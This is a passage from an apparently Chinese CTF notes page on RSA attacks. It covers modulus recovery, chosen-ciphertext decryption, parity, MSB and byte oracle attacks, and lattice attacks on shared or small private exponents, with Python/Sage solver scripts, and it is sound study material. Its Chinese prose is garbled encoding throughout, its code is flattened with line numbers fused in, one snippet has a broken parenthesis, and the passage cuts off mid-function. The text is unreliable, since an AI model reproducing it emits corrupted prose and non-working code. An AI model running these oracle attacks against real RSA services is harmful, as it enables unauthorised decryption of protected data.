n=a$ï¼Œ$c_4=(a^2+2abn+b^2n^2) \\bmod n = a^2 \\bmod n$ï¼Œ æ‰€ä»¥ $c_2^2$ å’Œ $c_4$ æ¨¡ $n$ åŒä½™ï¼Œå³ $c_2^2-c_4=kn$ï¼ŒåŒç† $c_2^3-c_8=kâ€™n$ï¼Œ ä¸€èˆ¬æ¥è¯´ $a^2$ æ¯” $n$ å¤§ï¼Œæ‰€ä»¥ $k \\neq 0$ã€‚ åŒç†è¿˜å¯ä»¥æ„é€ æ›´å¤šçš„ä¾‹å­å–ä»–ä»¬çš„å…¬å› æ•°ï¼Œæ¥æ›´åŠ ç¡®å®šåœ°æ‰¾ $n$ã€‚ 123456789101112131415161718192021222324252627282930import gmpy2def get_n(): nset = [] c2 = server_encode(2) c4 = server_encode(4) c8 = server_encode(8) nset.append(c2 * c2 - c4) nset.append(c2 * c2 * c2 - c8) c3 = server_encode(3) c9 = server_encode(9) c27 = server_encode(27) nset.append(c3 * c3 - c9) nset.append(c3 * c3 * c3 - c27) c5 = server_encode(5) c25 = server_encode(25) c125 = server_encode(125) nset.append(c5 * c5 - c25) nset.append(c5 * c5 * c5 - c125) n = nset[0] for x in nset: n = gmpy2.gcd(x, n) while n % 2 == 0: n //= 2 while n % 3 == 0: n //= 3 while n % 5 == 0: n //= 5 print(&#x27;n =&#x27;, n) return n é€‰æ‹©å¯†æ–‡æ”»å‡»é€‚ç”¨æƒ…å†µï¼šå¯ä»¥æ„é€ ä»»æ„å¯†æ–‡å¹¶è·å¾—å¯¹åº”æ˜æ–‡ï¼Œé€šè¿‡é€‰æ‹©å¯†æ–‡æ”»å‡»è·å¾—ç‰¹å®šçš„æ˜æ–‡ã€‚ å‡è®¾æœåŠ¡å™¨åˆ›å»ºäº†å¯†æ–‡ $c=m^e \\bmod n$ï¼Œå¹¶ä¸”æŠŠ $c$ å‘é€ç»™ç”¨æˆ·ï¼Œç”¨æˆ·å¯ä»¥å‘é€ä»»æ„å¯†æ–‡æœåŠ¡å™¨è¿”å›è§£å¯†åçš„æ˜æ–‡ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ±‚å‡º $m$ï¼š é€‰æ‹©ä»»æ„çš„ $x$ ä¸ $n$ äº’ç´ ï¼› è®¡ç®— $y=cx^e \\bmod n$ï¼› ç”±äºå¯ä»¥è¿›è¡Œé€‰æ‹©å¯†æ–‡æ”»å‡»ï¼Œå¯ä»¥æ±‚å¾— $y$ å¯¹åº”çš„è§£å¯†ç»“æœ $z=y^d$ï¼› åˆ™ $z=y^d=(cx^e)^d=c^dx=mx \\bmod n$ï¼Œç”±äº $x$ ä¸ $n$ äº’ç´ ï¼Œå®¹æ˜“æ±‚å¾—ç›¸åº”é€†å…ƒï¼Œè¿›è€Œå¯ä»¥å¾—åˆ° $m$ã€‚ 123456789101112from Crypto.Util.number import *def get_M(): X = getPrime(5) Y = (c * (X ** e)) % n Z = server_decode(Y) i = 0 while True: M = (n * i + Z) // X if &#x27;flag&#x27; in long_to_bytes(M): print(long_to_bytes(M)) break Parity Oracle AttackLSB Oracle Attackï¼ˆLeast Significant Bit Oracle Attack ï¼‰é€‚ç”¨æƒ…å†µï¼šå¯ä»¥é€‰æ‹©å¯†æ–‡å¹¶æ³„éœ²æ˜æ–‡çš„æœ€ä½ä½ï¼ˆå¥‡å¶æ€§ï¼‰ã€‚ æœåŠ¡å™¨ä¼šå¯¹ä¸€ä¸ªç»™å®šçš„å¯†æ–‡è¿›è¡Œè§£å¯†ï¼Œå¹¶ä¸”ä¼šæ£€æŸ¥è§£å¯†çš„æ˜æ–‡çš„å¥‡å¶æ€§ï¼Œå¹¶æ ¹æ®å¥‡å¶æ€§è¿”å›ç›¸åº”çš„å€¼ï¼Œæ¯”å¦‚1è¡¨ç¤ºå¥‡æ•°ï¼Œ0è¡¨ç¤ºå¶æ•°ã€‚é‚£ä¹ˆç»™å®šä¸€ä¸ªåŠ å¯†åçš„å¯†æ–‡ï¼Œåªéœ€è¦ $\\log_2n$ æ¬¡å°±å¯ä»¥çŸ¥é“è¿™ä¸ªå¯†æ–‡å¯¹åº”çš„æ˜æ–‡æ¶ˆæ¯ã€‚ å‡è®¾ $c=m^e \\bmod n$ï¼Œç¬¬ä¸€æ¬¡æ—¶ï¼Œæ„é€ å¯†æ–‡ $c \\cdot 2^e \\bmod n=(2m)^e \\bmod n$ï¼ŒæœåŠ¡å™¨è§£å¯†åå¾—åˆ° $2m \\bmod n$ã€‚ è¿™é‡Œï¼š $2m$ æ˜¯å¶æ•°ï¼Œå®ƒçš„å¹‚æ¬¡ä¹Ÿæ˜¯å¶æ•°ï¼› $n$ æ˜¯å¥‡æ•°ï¼Œå› ä¸ºå®ƒæ˜¯ç”±ä¸¤ä¸ªå¤§ç´ æ•°ç›¸ä¹˜å¾—åˆ°ã€‚ é‚£ä¹ˆï¼š æœåŠ¡å™¨è¿”å›å¥‡æ•°ï¼Œå³ $2m \\bmod n$ ä¸ºå¥‡æ•°ï¼Œåˆ™è¯´æ˜ $2m&gt;n$ï¼Œä¸”å‡å»äº†å¥‡æ•°ä¸ª $n$ï¼Œåˆå› ä¸º $2m&lt;2n$ï¼Œå› æ­¤å‡å»äº†ä¸€ä¸ª $n$ï¼Œå³ $\\frac{n}{2}\\leq m \\lt n$ï¼› æœåŠ¡å™¨è¿”å›å¶æ•°ï¼Œåˆ™ $2m&lt;n$ï¼Œå³ $0 \\leq m \\lt \\frac{n}{2}$ã€‚ ç¬¬äºŒæ¬¡æ—¶ï¼Œæ„é€ å¯†æ–‡ $c \\cdot 4^e \\bmod n$ï¼ŒæœåŠ¡å™¨è§£å¯†åå¾—åˆ° $4m \\bmod n$ï¼Œåˆ¤æ–­å…¶å¥‡å¶æ€§å¯ä»¥çŸ¥é“ $m$ å’Œ $\\frac{n}{4}$ çš„å¤§å°å…³ç³»ã€‚ ä»¥æ­¤ç±»æ¨ï¼Œç¬¬ $i$ æ¬¡æ—¶ï¼Œæ„é€ å¯†æ–‡ $c \\cdot 2^{ie} \\bmod n$ï¼ŒæœåŠ¡å™¨è§£å¯†åå¾—åˆ° $2^im \\bmod n$ï¼Œåˆ¤æ–­å…¶å¥‡å¶æ€§å¯ä»¥çŸ¥é“ $m$ å’Œ $\\frac{n}{2^i}$ çš„å¤§å°å…³ç³»ã€‚ æ‰€ä»¥æˆ‘ä»¬å°±æœ‰äº†ä¸€ä¸ªäºŒåˆ†ç®—æ³•ï¼Œå¯ä»¥åœ¨ $\\log_2n$ æ¬¡å†…å°† $m$ çš„èŒƒå›´é€¼è¿‘åˆ°ä¸€ä¸ªè¶³å¤Ÿç‹­çª„çš„ç©ºé—´ã€‚ å‡è®¾æœåŠ¡å™¨è¿”å› bï¼Œé‚£ä¹ˆå¯ä»¥å½’çº³ä¸ºï¼š 1234567L = 0R = nfor i in range(1024): if b: L = (L+R) // 2 else: R = (L+R) // 2 ç”±äºæ­¤å¤„æœ‰å¤§é‡æ•´é™¤è¿ç®—ï¼Œæ‰€ä»¥æœ€å¥½ç”¨ decimal åº“è¿›è¡Œç²¾ç¡®è®¡ç®—ï¼Œå¦åˆ™æœ€åç»“æœå¾ˆå¯èƒ½ä¼šå‡ºé”™ã€‚decimal.getcontext().prec ç”¨æ¥è®¾å®šç²¾åº¦ã€‚ 12345678910111213141516from Crypto.Util.number import *import decimaldef get_flag(): k = n.bit_length() decimal.getcontext().prec = k L = decimal.Decimal(0) R = decimal.Decimal(int(n)) for i in range(k): c = (c * pow(2, e, n)) % n recv = server_decode(c) if recv == 1: L = (L + R) // 2 else: R = (L + R) // 2 print(long_to_bytes(int((R)))) æ›´å¤šä¿¡æ¯å¯å‚è€ƒï¼šRSA Least-Significant-Bit Oracle Attack å’Œ RSA least significant bit oracle attack ã€‚ 1234567891011121314151617import decimaldef oracle(): return lsb == &#x27;odd&#x27;def partial(c, e, n): k = n.bit_length() decimal.getcontext().prec = k # for &#x27;precise enough&#x27; floats lo = decimal.Decimal(0) hi = decimal.Decimal(n) for i in range(k): if not oracle(c): hi = (lo + hi) // 2 else: lo = (lo + hi) // 2 c = (c * pow(2, e, n)) % n # print i, int(hi - lo) return int(hi) MSB Oracle Attackï¼ˆMost Significant Bit Oracle Attack ï¼‰é€‚ç”¨æƒ…å†µï¼šå¯ä»¥é€‰æ‹©å¯†æ–‡å¹¶æ³„éœ²æ˜æ–‡çš„æœ€é«˜ä½ï¼ˆå¥‡å¶æ€§ï¼‰ã€‚ å‡è®¾è¿œç¨‹æä¾›ä¸€ä¸ªè§£å¯†æœåŠ¡ï¼Œä½†æ˜¯åªè¿”å›æ˜æ–‡çš„æœ€é«˜å­—èŠ‚ï¼Œå¹¶ä¸”æ˜æ–‡çš„å½¢å¼æ˜¯64å­—èŠ‚ï¼Œé«˜ä½ç”¨ \\x00 å¡«å……ã€‚ å°†åŠ å¯†çš„å†…å®¹æ‹¿å»è§£å¯†ä¼šå¾—åˆ° $m$ï¼Œä½†æ˜¯å›æ˜¾æœ€é«˜ä½æ˜¯ \\x00ï¼Œæ„é€ å¯†æ–‡ $c \\cdot 2^e$ï¼Œè§£å¯†ä¼šå¾—åˆ° $2m \\bmod n$ï¼Œ ä¸æ–­æ„é€ å¯†æ–‡ $c \\cdot 2^{ie}$ï¼Œå½“æœ€é«˜ä½ä¸æ˜¯ \\x00 æ—¶ï¼Œè®°å½•ä¸‹å€¼ä¸º $x$ï¼Œåˆ™è¯´æ˜ $mx&gt;2^{\\text{kbit}}$ï¼Œ ç„¶åå†ç›¸åº”ç¼©å° $x$ ï¼Œå¯ä»¥åˆ©ç”¨äºŒåˆ†æ³•ï¼Œæ¯”å¦‚å½“ç¬¬ä¸€æ¬¡æ‹¿åˆ° $mx&gt;2^{\\text{kbit}}$ï¼Œé‚£ä¹ˆæœ‰ $m(\\frac{x}{2})&lt;2^{\\text{kbit}}$ï¼Œå› æ­¤æ–°çš„ $xâ€™$ å¿…å®šæ»¡è¶³ $\\frac{x}{2} \\lt xâ€™ \\lt x$ï¼Œæ¥ç€å°è¯• $\\frac{x+\\frac{x}{2}}{2}$ å°±å¥½ã€‚ æœ€ç»ˆå¯ä»¥æ‰¾åˆ°ä¸€ä¸ª $X$ï¼Œæ»¡è¶³ $mX \\lt 2^{\\text{kbit}}$ ä¸” $m(X+1) \\gt 2^{\\text{kbit}}$ï¼Œç”±äºæ˜¯æ•´é™¤ï¼Œæ‰€ä»¥ä¼šæœ‰è¯¯å·®ï¼Œæœ€åçš„ $m$ åœ¨ $\\frac{2^{\\text{kbit}}}{x}$ é™„è¿‘ã€‚ å‚è€ƒï¼šPwnhub - pkcs4 Byte Oracle Attacké€‚ç”¨æƒ…å†µï¼šå¯ä»¥é€‰æ‹©å¯†æ–‡å¹¶æ³„éœ²æœ€åä¸€ä¸ªå­—èŠ‚ã€‚ æœåŠ¡å™¨ä¼šå¯¹ä¸€ä¸ªç»™å®šçš„å¯†æ–‡è¿›è¡Œè§£å¯†ï¼Œå¹¶ä¸”ä¼šç»™å‡ºæ˜æ–‡çš„æœ€åä¸€ä¸ªå­—èŠ‚ã€‚é‚£ä¹ˆç»™å®šä¸€ä¸ªåŠ å¯†åçš„å¯†æ–‡ï¼Œåªéœ€è¦ $\\log_{256}n$ æ¬¡å°±å¯ä»¥çŸ¥é“è¿™ä¸ªå¯†æ–‡å¯¹åº”çš„æ˜æ–‡æ¶ˆæ¯ã€‚ è¿™æ˜¯ RSA Parity Oracle çš„æ‰©å±•ï¼Œæ—¢ç„¶å¯ä»¥æ³„éœ²å‡ºæœ€åä¸€ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæŒ‰é“ç†è·å–å¯†æ–‡å¯¹åº”æ˜æ–‡çš„æ¬¡æ•°åº”è¯¥å¯ä»¥å‡å°‘ã€‚ å‡è®¾ $c=m^e \\bmod n$ï¼Œç¬¬ä¸€æ¬¡æ—¶ï¼Œæ„é€ å¯†æ–‡ $c \\cdot 256^e \\bmod n=(256m)^e \\bmod n$ï¼ŒæœåŠ¡å™¨è§£å¯†åå¾—åˆ° $256m \\bmod n$ã€‚ è¿™é‡Œï¼š $256m$ æ˜¯å¶æ•°ï¼Œå®ƒçš„å¹‚æ¬¡ä¹Ÿæ˜¯å¶æ•°ï¼› $n$ æ˜¯å¥‡æ•°ï¼Œå› ä¸ºå®ƒæ˜¯ç”±ä¸¤ä¸ªå¤§ç´ æ•°ç›¸ä¹˜å¾—åˆ°ã€‚ ç”±äº $m=c^d \\bmod n$ï¼Œæ‰€ä»¥ $m \\lt n$ï¼Œé‚£ä¹ˆï¼š$256m \\bmod n=256m-kn$ï¼Œ$(k&lt;256)$ï¼Œ è€Œä¸”å¯¹äºä¸¤ä¸ªä¸åŒçš„ $k_1,k_2$ï¼Œæœ‰ï¼š$(256m-k_1n) \\bmod 256 \\neq (256m-k_2n) \\bmod 256$ï¼Œ åŒæ—¶ $256m-kn$ çš„æœ€åä¸€ä¸ªå­—èŠ‚å…¶å®å°±æ˜¯ $-kn$ åœ¨æ¨¡ $256$ çš„æƒ…å†µä¸‹è·å–çš„ã€‚ é‚£ä¹ˆï¼Œå¯ä»¥é¦–å…ˆæšä¸¾å‡º $0 \\sim 255$ æƒ…å†µä¸‹çš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œæ„é€ ä¸€ä¸ª $k$ å’Œæœ€åä¸€ä¸ªå­—èŠ‚çš„æ˜ å°„è¡¨ $\\text{M}$ã€‚ å½“æœåŠ¡å™¨è¿”å›æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œå¯ä»¥æ ¹æ®ä¸Šè¿°æ„é€ çš„æ˜ å°„è¡¨ $\\text{M}$ å¾—çŸ¥ $k$ï¼Œå³å‡å»äº† $k$ ä¸ª $n$ï¼Œå³ $kn \\leq 256m \\leq (k+1)n$ã€‚ ä»¥æ­¤ç±»æ¨ï¼Œç¬¬ $i$ æ¬¡æ—¶ï¼Œæ„é€ å¯†æ–‡ $c \\cdot 256^{ie} \\bmod n$ï¼ŒæœåŠ¡å™¨è§£å¯†åå¾—åˆ° $256^im \\bmod n = 256^im-kn$ï¼Œå³ï¼š $kn \\leq 256^im \\leq (k+1)n$ï¼Œ $\\frac{kn}{256^i} \\leq m \\leq \\frac{(k+1)n}{256^i}$ã€‚ é‚£ä¹ˆï¼Œå¯ä»¥è®¾åˆå§‹èŒƒå›´ä¸ºï¼š$\\frac{M}{n} \\in [L_0,R_0],(L_0=0,R_0=1)$ï¼Œ ç¬¬ $i$ æ¬¡è¿­ä»£åï¼š$L_i=L_{i-1}+\\frac{k_i}{256^i},R_i=R_{i-1}+\\frac{k_i+1}{256^i}$ã€‚ æœ€åä¸€ä¸ªé—®é¢˜æ˜¯è¿­ä»£çš„æ¬¡æ•°ï¼Œç”±äºæ˜æ–‡çš„æœ€åä¸€ä¸ªå­—èŠ‚å¯ä»¥ç›´æ¥ç”±æœåŠ¡å™¨è§£å¯†å¾—åˆ°ï¼Œé‚£ä¹ˆåªéœ€è¦é™å®š $m$ çš„èŒƒå›´è‡³ $m_{\\text{max}}-m_{\\text{min}} \\lt 256$ï¼Œå³ $n(R_i-L_i)= \\frac{n}{256^i} \\lt 256$ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾ $n \\lt 2^{1024}$ï¼Œç”±ä¸Šå¼å¯å¾— $i \\gt 128$ã€‚ ä¸€èˆ¬å¯¹äºè¿™æ ·çš„ Oracleï¼Œæœ€å¤šéœ€è¦ $\\log_{2^{\\text{bits}}}n$ æ¬¡è¿­ä»£å³å¯ç¡®å®šæ˜æ–‡ï¼Œå…¶ä¸­ bits ä¸ºæ³„éœ²çš„æ˜æ–‡ bit æ•°ã€‚RSA Parity Oracle ä¸º 1ï¼ŒRSA Byte Oracle ä¸º 8ã€‚ å‡è®¾æœåŠ¡å™¨è¿”å›äº† bï¼Œé‚£ä¹ˆå¯ä»¥å½’çº³ä¸ºï¼š 1234567L = 0R = 1for i in range(128): k = mab[b] L = L + k // 256**(i+1) R = L + (k+1ï¼‰// 256**(i+1)M = L * n å¦‚æœä¸çŸ¥é“ $e$ ä½†æœåŠ¡å™¨æä¾›ä»»æ„æ˜æ–‡åŠ å¯†æœåŠ¡ï¼Œå¯ä»¥è®©æœåŠ¡å™¨åŠ å¯† $256$ï¼Œå¾—åˆ° $256^e \\bmod n$ã€‚ ç”±äºæœ‰å¤§é‡é™¤æ³•è¿ç®—ï¼Œä¸ºä¿è¯ç²¾åº¦ï¼Œå°†ä¸­é—´è¿‡ç¨‹ç”¨ Fraction åº“ä¿å­˜ä¸ºåˆ†æ•°ã€‚ æœ€åä¸€å­—èŠ‚çš„æ•°æ®ä¸å‡†ç¡®è¦å‡æ‰ï¼Œä»æœåŠ¡å™¨è¿”å›ç²¾ç¡®çš„æœ€åä¸€å­—èŠ‚æ•°æ®ã€‚ å…¶å®åªè¦æ±‚å‡º L ä¸‹é™å³å¯ï¼Œæ— éœ€æ±‚å‡º R ä¸Šé™ã€‚ 1234567891011121314151617181920from Crypto.Util.number import *from fractions import Fractiondef get_flag(): map = &#123;&#125; for i in range(0, 256): map[-n * i % 256] = i cipher256 = server_encode(256) backup = c L = Fraction(0, 1) R = Fraction(1, 1) for i in range(128): c = c * cipher256 % n b = server_decode(c) k = map[b] L, R = L + Fraction(k, 256**(i+1)), L + Fraction(k+1, 256**(i+1)) m = int(L * n) print(long_to_bytes(m - m % 256 + server_decode(backup))) â€‹ Common Private Exponentï¼ˆå…±ç§é’¥æŒ‡æ•°æ”»å‡»ï¼Œdç›¸åŒï¼‰åŠ å¯†ç”¨åŒæ ·çš„ç§é’¥å¹¶ä¸”ç§é’¥æ¯”è¾ƒçŸ­ï¼Œä»è€Œå¯¼è‡´äº†åŠ å¯†ç³»ç»Ÿè¢«ç ´è§£ã€‚ å‡å®šï¼š $\\begin{cases} e_1d=1+k_1\\varphi(N_1) \\newline e_2d=1+k_2\\varphi(N_2) \\newline {\\vdots} \\newline e_rd=1+k_r\\varphi(N_r) \\end{cases}$ å…¶ä¸­ï¼Œ$N_1 \\lt N_2 \\lt \\cdots \\lt N_r \\lt 2N_1$ã€‚ æ„é€ æ ¼ï¼š $B_r=\\begin{bmatrix}{M}&amp;{e_1}&amp;{e_2}&amp;{\\cdots}&amp;{e_{r}}\\newline{0}&amp;{-N_1}&amp;{0}&amp;{\\cdots}&amp;{0}\\newline{0}&amp;{0}&amp;{-N_2}&amp;{\\cdots}&amp;{0}\\newline{\\vdots}&amp;{\\vdots}&amp;{\\vdots}&amp;{\\ddots}&amp;{\\vdots}\\newline{0}&amp;{0}&amp;{0}&amp;{\\cdots}&amp;{-N_r}\\newline\\end{bmatrix}$ å…¶ä¸­ $M=\\lfloor N_r^{\\frac{1}{2}} \\rfloor$ã€‚ å†åˆ©ç”¨LLLç®—æ³•è¿›è¡Œè§„çº¦å¾—åˆ° $\\vert b_1\\vert=Md$ï¼Œåˆ™ $d=\\cfrac{\\vert b_1 \\vert}{M}$ï¼Œä»è€Œè§£å¯†å¯†æ–‡å¾—åˆ°æ˜æ–‡ã€‚ ä½¿ç”¨æ¡ä»¶ï¼š $d \\lt N_r^{\\delta_r}ï¼Œ\\delta_r \\lt \\cfrac{1}{2}-\\cfrac{1}{2(r+1)}-\\log_{N_r}{(6)}$ å‚è€ƒï¼š Lattice Based Attack on Common Private Exponent RSA SCTF 2020 - RSA 1234567891011121314151617181920212223###Sage###from gmpy2 import *e0=n0=c0=e1=n1=c1=e2=n2=c2=M=iroot(int(n2),int(2))[0]a=[0]*4a[0]=[M,e0,e1,e2]a[1]=[0,-n0,0,0]a[2]=[0,0,-n1,0]a[3]=[0,0,0,-n2]Mat = matrix(ZZ,a)Mat_LLL=Mat.LLL()d = abs(Mat_LLL[0][0])/Mprint(bytes.fromhex(hex(pow(c1,int(d),int(n1)))[2:])) â€‹ å¤šç»„ä½è§£å¯†æŒ‡æ•°æ”»å‡»é€‚ç”¨æƒ…å†µï¼š2-4ç»„ $e$ï¼Œä¸” $d$ è¾ƒå° ç»™å®š2ç»„ $g=\\gcd(p-1,q-1),\\lambda(n)=\\frac{\\varphi(n)}{g},s=1-p-q$ ä¸”æœ‰ $ed-k\\lambda(n)=1$ï¼Œå¾—åˆ° $edg-kn=g+ks\\quad (1)$ è®¾ $e_1$ å¯¹åº” $k_1$ï¼Œ$e_2$ å¯¹åº” $k_2$ï¼Œåˆ™æœ‰ $k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1}\\quad (2)$ ç”±(1)(2)æœ‰ï¼š $\\left\\{ \\begin{matrix} e_{1}d_{1}g-k_{1}n=g+k_{1}s \\newline k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1} \\newline e_{1}e_{2}d_{1}d_{2}g_{2}-e_{1}d_{1}gk_{2}n-e_{2}d_{2}gk_{1}n+k_{1}k_{2}n^{2}=(g+k_{1}s)(g+k_{2}s) \\end{matrix} \\right.$ ä¸Šè¿°ç­‰å¼ç»„ä¹Ÿå¯è¡¨ç¤ºä¸º $bL_2 =[k_{1}k_{2},k_{2}d_{1}g,k_{1}d_{2}g,d_{1}d_{2}g^{2}]\\cdot\\left[ \\begin{matrix} n &amp; -M_{1}n &amp; 0 &amp; n^{2} \\newline 0 &amp; M_{1}e_{1} &amp; M_{2}e_{1} &amp; -e_{1}n \\newline 0 &amp; 0 &amp; -M_{2}e_{2} &amp; -e_{2}n \\newline 0 &amp; 0 &amp; 0 &amp; e_{1}e_{2} \\end{matrix} \\right] =[k_{1}k_{2}n,M_{1}k_{2}(g+k_{1}s),M_{2}g(k_{2}-k_{1})ï¼Œ(g+k_{1}s)(g+k_{2}s)]$ ï¼ˆå…¶ä¸­ $M_{1}=n^{1/2},M_{2}=n^{1+\\alpha_{2}},d\\approx n^{\\alpha_{2}}$ï¼‰ å¯¹éƒ¨åˆ†å‚æ•°è¿›è¡Œä¸Šç•Œä¼°è®¡ï¼Œkä¸Šç•Œè¿‘ä¼¼äº $d\\approx N^{\\alpha_{2}}$, $|s|$ ä¸Šç•Œ $\\approx N^{1/2}$ï¼Œ$g$ ä¸€èˆ¬ç›¸å¯¹æå° å› æ­¤ä¸Šé¢çš„çŸ©é˜µè¡¨ç¤º $BA=C$ ä¸­ï¼Œ$C$ çš„æ¯ä¸ªå…ƒçš„sizeéƒ½è¿‘ä¼¼ $n^{1+2\\alpha_{2}}$ï¼Œæ‰€ä»¥ $|C|\\approx 2\\cdot n^{1+2\\alpha_{2}}$ $B$ ä½œä¸ºæ ¼åŸºçš„æ ¼ä¸­ï¼Œæœ€çŸ­å‘é‡ç”±Minkowski BoundsçŸ¥ $\\approx \\sqrt{4}\\det(B)^{1/4}\\approx 2\\cdot n^{(13/2+\\alpha_{2})/4}$ å› æ­¤åªè¦æ»¡è¶³ $n^{1+2\\alpha_{2}}&lt;n^{(13/2+\\alpha_{2})/4}$ å³å¯å°†é—®é¢˜è½¬åŒ–ä¸ºSVPï¼ˆ$\\alpha_{2}&lt;\\frac{5}{14}$ï¼‰ 12345678910111213141516171819202122232425262728 from sage.all import *import gmpy2N = e1 = e2 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**0.5) M2 = int( gmpy2.mpz(N)**(1+alpha2) ) D = diagonal_matrix(ZZ, [N, M1, M2, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2], [0, e1, -e1, -e1*N], [0, 0, e2, -e2*N], [0, 0, 0, e1*e2] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi = (x[0,1]/x[0,0]*e1).floor() try: d = inverse_mod( 65537, phi) m = hex(power_mod(c, d, N))[2:] if m.startswith(&#x27;44415343&#x27;): print(i) print(bytes.fromhex(m)) break except: pass å‚è€ƒï¼šDe1CTF 2020 - easyRSA ç»™å®š3ç»„ ç±»ä¼¼2ç»„æƒ…å†µï¼Œå…¶ä¸­ $b=[k_1k_2k_3,d_1gk_2k_3,k_1d_2gk_3,d_1d_2g^2k_3,k_1k_2d_3g,k_1d_3g,k_2d_3g,d_1d_2d_3g^3]$ $L_3=\\left[\\begin{matrix} 1-N &amp; 0 &amp; N^2 &amp; 0 &amp; 0 &amp; 0 &amp; -N^3 \\newline e_1 &amp; -e_1 &amp; -e_1N &amp; -e &amp; 0 &amp; e_1N &amp; e_1N^2 \\newline 0 &amp; e_2 &amp; -e_2N &amp; 0 &amp; e_2N &amp; 0 &amp; e_2N^2 \\newline 0 &amp; 0 &amp; e_1e_2 &amp; 0 &amp; -e_1e_2 &amp; -e_1e_2 &amp; -e_1e_2N \\newline 0 &amp; 0 &amp; 0 &amp; e_3 &amp; -e_3N &amp; -e_3N &amp; e_3N^3 \\newline 0 &amp; 0 &amp; 0 &amp; 0 &amp; e_1e_3 &amp; 0 &amp; -e_1e_3N \\newline 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; e_2e_3 &amp; -e_2e_3N \\newline 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; e_1e_2e_3 \\end{matrix}\\right] \\times D$ å…¶ä¸­ $D={\\rm diag}(N^{3/2},N,N^{(3/2)+\\alpha_3},N^{1/2},N^{(3/2)+\\alpha_3},N^{1+\\alpha_3},N^{1+\\alpha_3}ï¼Œ1)$ å‚è€ƒï¼š3kCTF - RSA Textbook 123456789101112131415161718192021222324252627282930313233343536373839404142from sage.all import *import gmpy2N = e1 = e2 = e3 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**(3./2)) M2 = int( gmpy2.mpz(N) ) M3 = int(gmpy2.mpz(N)**(3./2 + alpha2)) M4 = int( gmpy2.mpz(N)**(0.5) ) M5 = int( gmpy2.mpz(N)**(3./2 + alpha2) ) M6 = int( gmpy2.mpz(N)**(1.+alpha2) ) M7 = int( gmpy2.mpz(N)**(1.+alpha2) ) D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2, 0, 0, 0, -N**3], [0, e1, -e1, -e1*N, -e1, 0, e1*N, e1*N**2], [0, 0, e2, -e2*N, 0, e2*N, 0, e2*N**2], [0, 0, 0, e1*e2, 0, -e1*e2, -e1*e2, -e1*e2*N], [0, 0, 0, 0, e3, -e3*N, -e3*N, e3*N**2], [0, 0, 0, 0, 0, e1*e3, 0, -e1*e3*N], [0, 0, 0, 0, 0, 0, e2*e3, -e2*e3*N], [0, 0, 0, 0, 0, 0, 0, e1*e2*e3] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi_ = (e1*x[0,1]/x[0,0]).floor() try: d = inverse_mod( 65537, phi_) m = hex(power_mod(c, d, N))[2:] if m.startswith(&#x27;44415343&#x27;): print(i) print(bytes.fromhex(m)) break except: pass ç»™å®šæ›´å¤šç»„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236from Crypto.Util.number import *isdigit = lambda x: ord(&#x27;0&#x27;) &lt;= ord(x) &lt;= ord(&#x27;9&#x27;)def my_permutations(g, n): sub = [] res = [] def dfs(s, prev): if len(s) == n: res.append(s[::]) for i in g: if i in s or i &lt; prev: continue s.append(i) dfs(s, max(prev, i)) s.remove(i) dfs(sub, 0) return resclass X3NNY(object): def __init__(self, exp1, exp2): self.exp1 = exp1 self.exp2 = exp2 def __mul__(self, b): return X3NNY(self.exp1 * b.exp1, self.exp2 * b.exp2) def __repr__(self): return &#x27;%s = %s&#x27; % (self.exp1.expand().collect_common_factors(), self.exp2)class X_Complex(object): def __init__(self, exp): i = 0 s = &#x27;%s&#x27; % exp while i &lt; len(s): if isdigit(s[i]): num = 0 while i &lt; len(s) and isdigit(s[i]): num = num*10 + int(s[i]) i += 1 if i &gt;= len(s): self.b = num elif s[i] == &#x27;*&#x27;: self.a = num i += 2 elif s[i] == &#x27;/&#x27;: i += 1 r = 0 while i &lt; len(s) and isdigit(s[i]): r = r*10 + int(s[i]) i += 1 self.b = num/r else: i += 1 if not hasattr(self, &#x27;a&#x27;): self.a = 1 if not hasattr(self, &#x27;b&#x27;): self.b = 0def WW(e, d, k, g, N, s): return X3NNY(e*d*g-k*N, g+k*s)def GG(e1, e2, d1, d2, k1, k2): return X3NNY(e1*d1*k2- e2*d2*k1, k2 - k1)def W(i): e = eval(&quot;e%d&quot; % i) d = eval(&quot;d%d&quot; % i) k = eval(&quot;k%d&quot; % i) return WW(e, d, k, g, N, s)def G(i, j): e1 = eval(&quot;e%d&quot; % i) d1 = eval(&quot;d%d&quot; % i) k1 = eval(&quot;k%d&quot; % i) e2 = eval(&quot;e%d&quot; % j) d2 = eval(&quot;d%d&quot; % j) k2 = eval(&quot;k%d&quot; % j) return GG(e1, e2, d1, d2, k1, k2)def R(e, sn): # min u max v ret = X3NNY(1, 1) n = max(e) nn = len(e) l = set(i for i in range(1, n+1)) debug = &#x27;&#x27; u, v = 0, 0 for i in e: if i == 1: ret *= W(1) debug += &#x27;W(%d)&#x27; % i nn -= 1 l.remove(1) u += 1 elif i &gt; min(l) and len(l) &gt;= 2*nn: ret *= G(min(l), i) nn -= 1 debug += &#x27;G(%d, %d)&#x27; % (min(l), i) l.remove(min(l)) l.remove(i) v += 1 else: ret *= W(i) l.remove(i) debug += &#x27;W(%d)&#x27; % i nn -= 1 u += 1 # print(debug, end = &#x27; &#x27;) return ret, u/2 + (sn - 